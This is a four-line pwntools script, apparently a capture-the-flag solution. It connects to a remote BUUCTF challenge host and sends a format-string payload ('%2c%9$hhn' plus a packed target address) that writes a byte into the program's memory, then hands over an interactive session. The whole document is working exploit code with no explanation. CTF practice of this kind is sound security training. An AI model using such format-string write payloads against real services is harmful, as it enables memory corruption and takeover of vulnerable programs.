from pwn import*
p = remote('node3.buuoj.cn',26265)
p.sendline('%2c%9$hhn' + p64(0x60105C))
p.interactive()